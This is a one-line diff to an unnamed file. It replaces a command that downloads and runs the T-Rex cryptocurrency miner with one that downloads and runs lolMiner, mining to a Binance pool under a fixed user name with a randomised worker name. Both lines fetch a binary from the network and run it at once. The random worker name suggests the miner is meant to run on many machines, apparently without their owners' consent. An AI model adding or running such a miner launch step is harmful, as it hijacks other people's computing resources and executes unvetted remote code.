@@ -1,1 +1,1 @@
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz && tar -xvf t-rex-0.21.6-linux.tar.gz && ./t-rex -a ethash -o us.stratu.ms:16484 -u 0x3567a123d718eec48f690318cf9c44d3334af2f8 -w $(echo $(shuf -i 1000-9999 -n 1)-eth) -p x
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && ./lolMiner --algo AUTOLYKOS2 --pool stratum+tcp://ethash.poolbinance.com:1800 --user Amit1011 --worker $(echo $(shuf -i 1000-9999 -n 1))
